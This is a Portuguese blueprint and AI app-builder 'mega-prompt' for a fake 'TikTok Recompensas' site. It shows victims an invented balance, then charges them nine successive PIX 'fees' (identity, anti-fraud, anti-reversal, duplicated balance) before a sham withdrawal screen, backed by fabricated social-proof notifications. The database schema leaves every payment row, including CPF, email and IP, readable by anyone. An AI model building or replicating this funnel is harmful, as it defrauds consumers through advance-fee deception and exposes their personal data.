# Blueprint Completo — Funil TikTok Recompensas

## 🎯 Visão Geral
App React (Vite + TypeScript + Tailwind) que simula uma plataforma de "recompensas TikTok" com funil de vendas de múltiplas etapas de upsell. Integra pagamentos PIX via SigmaPay e tracking via TikTok Pixel.

---

## 📁 Estrutura de Arquivos

```
src/
├── App.tsx                          # Router principal com lazy loading
├── main.tsx                         # Entry point React
├── index.css                        # Design tokens HSL + animações
├── pages/
│   ├── Index.tsx                    # Landing page (TikTokBonus)
│   ├── RedeemRewards.tsx            # Página de resgate com formulário PIX
│   ├── NotFound.tsx                 # 404
│   └── funnel/
│       ├── FunnelConfirmTaxPage.tsx  # Taxa de confirmação (usa usePaymentFlow)
│       ├── FunnelUpsellTENFPage.tsx  # Upsell TENF
│       ├── FunnelUpsellTransacionalPage.tsx
│       ├── FunnelUpsellAntiFraudePage.tsx
│       ├── FunnelUpsellBonusOcultoPage.tsx
│       ├── FunnelUpsellAntiReversaoPage.tsx
│       ├── FunnelUpsellSaqueImediatoPage.tsx
│       ├── FunnelUpsellAntiErrosPage.tsx
│       ├── FunnelUpsellSaldoDuplicadoPage.tsx
│       ├── FunnelWithdrawProcessingPage.tsx
│       └── FunnelSuccessPage.tsx
├── components/
│   ├── TikTokBonus.tsx              # Componente principal da landing
│   ├── BalanceCard.tsx              # Card de saldo animado
│   ├── CongratulationsCard.tsx      # Card de parabéns
│   ├── CheckInSection.tsx           # Seção de check-in
│   ├── TaskItem.tsx                 # Item de tarefa
│   ├── ProgressTask.tsx             # Tarefa com progresso
│   ├── PrizePopup.tsx               # Popup de prêmio
│   ├── StickyBalanceBar.tsx         # Barra fixa de saldo
│   ├── CarnivalConfetti.tsx         # Confete animado
│   └── funnel/
│       ├── FunnelLayout.tsx          # Layout com AnimatePresence + ErrorBoundary
│       ├── FunnelPageTransition.tsx   # Transição framer-motion
│       ├── FunnelErrorBoundary.tsx    # Error boundary amigável
│       ├── FunnelSkeleton.tsx         # Skeleton para lazy loading
│       ├── FunnelConfirmTax.tsx       # UI da taxa de confirmação
│       ├── FunnelUpsellTENF.tsx
│       ├── FunnelUpsellTransacional.tsx
│       ├── FunnelUpsellAntiFraude.tsx
│       ├── FunnelUpsellBonusOculto.tsx
│       ├── FunnelUpsellAntiReversao.tsx
│       ├── FunnelUpsellSaqueImediato.tsx
│       ├── FunnelUpsellAntiErros.tsx
│       ├── FunnelUpsellSaldoDuplicado.tsx
│       ├── FunnelPixPopup.tsx         # Popup de pagamento PIX com QR
│       ├── FunnelProcessingScreen.tsx # Tela de processamento
│       ├── FunnelWithdrawNotification.tsx # Notificações de social proof
│       ├── FunnelSocialProofNotifications.tsx # Alias
│       ├── types.ts                  # Tipos compartilhados
│       └── index.ts                  # Barrel exports
├── hooks/
│   ├── usePaymentFlow.ts            # Hook central de pagamento
│   ├── usePaymentCheck.ts           # Verificação manual
│   ├── usePixGeneration.ts          # Geração de PIX com cache
│   ├── useLeadData.ts               # Dados do lead
│   ├── usePrefetchFunnelPages.ts    # Prefetch
│   ├── useTikTokAttribution.ts      # Atribuição TikTok
│   └── use-mobile.tsx
├── lib/
│   ├── abTest.ts                    # A/B test taxa
│   ├── abTestTenf.ts                # A/B test TENF
│   ├── tiktokPixel.ts              # Tracking
│   ├── generateRandomEmail.ts
│   └── utils.ts
└── assets/                          # Imagens

supabase/functions/
├── generate-pix/index.ts
└── check-payment/index.ts
```

---

## 🗄️ Schema do Banco

```sql
CREATE TABLE public.pix_payments (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  amount NUMERIC NOT NULL,
  paid_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  payment_type TEXT,
  pix_code TEXT,
  pix_qr_code_base64 TEXT,
  pix_url TEXT,
  customer_name TEXT,
  customer_email TEXT,
  customer_cpf TEXT,
  ab_variant TEXT,
  ttclid TEXT,
  ttp TEXT,
  page_url TEXT,
  page_referrer TEXT,
  ip_address TEXT,
  transaction_id TEXT NOT NULL,
  transaction_hash TEXT,
  user_agent TEXT,
  status TEXT NOT NULL DEFAULT 'pending'
);

ALTER TABLE public.pix_payments ENABLE ROW LEVEL SECURITY;

CREATE POLICY "Anyone can create payments" ON public.pix_payments
  FOR INSERT WITH CHECK (true);
CREATE POLICY "Anyone can view payments" ON public.pix_payments
  FOR SELECT USING (true);
CREATE POLICY "Service role can update" ON public.pix_payments
  FOR UPDATE USING (true);

ALTER PUBLICATION supabase_realtime ADD TABLE public.pix_payments;
```

---

## 🔄 Fluxo do Funil

```
/ → /resgatar → /funil/confirmar-identidade (R$27,91)
  → upsell-tenf (R$44,37) → upsell-transacional (R$33,41)
  → upsell-antifraude (R$67,43) → upsell-bonus-oculto (R$19,73)
  → upsell-anti-reversao (R$24,87) → upsell-saque-imediato (R$19,83)
  → upsell-anti-erros (R$22,37) → upsell-saldo-duplicado (R$17,63)
  → processando-saque → sucesso
```

---

## 🔑 Secret: `SIGMA_API_TOKEN`

---

## 📋 Mega-Prompt para Replicação Rápida

Cole em nova instância Lovable:

---

Crie um app React+Vite+TypeScript+Tailwind que simula "TikTok Recompensas" com funil de vendas PIX.

**Landing (/):** Card saldo R$2.834,72 animado, popup prêmio Carnaval com countdown, check-in completo, tarefas concluídas, confete CSS, sticky bar, botão "Sacar" → /resgatar.

**Resgate (/resgatar):** Bottom sheet PIX, formulário (tipo chave, chave, nome, CPF com validação algorítmica), salva sessionStorage, navega → /funil/confirmar-identidade.

**Funil (/funil/...):** 9 upsells sequenciais. Cada um: conteúdo persuasivo com urgência, botão gera PIX via edge function, popup QR+copia-e-cola, polling 2.5s + Realtime verifica pagamento, tela processamento animada, links avançar/voltar.

Etapas: confirmar-identidade R$27,91 → upsell-tenf R$44,37 → upsell-transacional R$33,41 (tema Serasa) → upsell-antifraude R$67,43 → upsell-bonus-oculto R$19,73 → upsell-anti-reversao R$24,87 → upsell-saque-imediato R$19,83 → upsell-anti-erros R$22,37 → upsell-saldo-duplicado R$17,63 → processando-saque (animação 7 steps) → sucesso.

**DB:** Tabela pix_payments (id, amount, status, transaction_id, transaction_hash, payment_type, pix_code, pix_qr_code_base64, customer_name/email/cpf, ab_variant, ttclid, page_url, page_referrer, ip_address, user_agent, paid_at, created_at, updated_at). RLS: insert+select público, update service role.

**Edge Functions:** 
1. generate-pix: POST SigmaPay `https://api.sigmapay.com.br/api/public/v1/transactions` com offer_hash='zxw2p8esaw', product_hash='31atjri7nd', amount em centavos. Salva DB, retorna pix_code.
2. check-payment: Consulta DB + SigmaPay GET `/transactions/:hash`, atualiza se pago.

**Secret:** SIGMA_API_TOKEN

**Otimizações:** Lazy loading, prefetch próximas 2 páginas, hook usePaymentFlow centralizado, cache PIX sessionStorage 30min, Error Boundary, Skeleton, notificações social proof com fotos locais matching gênero, Framer Motion transições, TikTok Pixel (InitiateCheckout+Purchase).

**Deps:** qrcode.react, framer-motion, @supabase/supabase-js, @tanstack/react-query, lucide-react, react-router-dom.
